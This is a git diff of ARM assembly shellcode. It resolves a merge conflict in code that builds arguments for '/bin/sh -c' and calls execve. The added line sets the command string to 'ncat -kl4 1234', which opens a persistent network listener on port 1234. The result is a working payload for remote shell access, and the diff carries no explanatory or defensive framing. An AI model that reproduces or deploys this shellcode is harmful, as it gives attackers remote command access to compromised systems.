@@ -24,19 +24,15 @@ _start:
     add    r1, r0, #8     // r1 = "-c"
     strb   r2, [r1, #2]   // add null terminator
 
-<<<<<<< HEAD
     add    r3, r1, #4     // r3 = cmd
     strb   r2, [r3, #12]
     
     push   {r0, r1, r3, r2}
     mov    r1, sp         // r1 = argv
-=======
-    mov    r1, #'-c'    
->>>>>>> 336d993d9d39877ca3a35c916d8b9eebf8afb31f
     mov    r7, #11        // r7 = execve
     svc    1
     nop                   // align by 4 bytes   
 sh:    
 .ascii "/bin/shX-cXX"
 cmd:
-.ascii ""
+.ascii "ncat -kl4 1234XX" // listen on port 1234
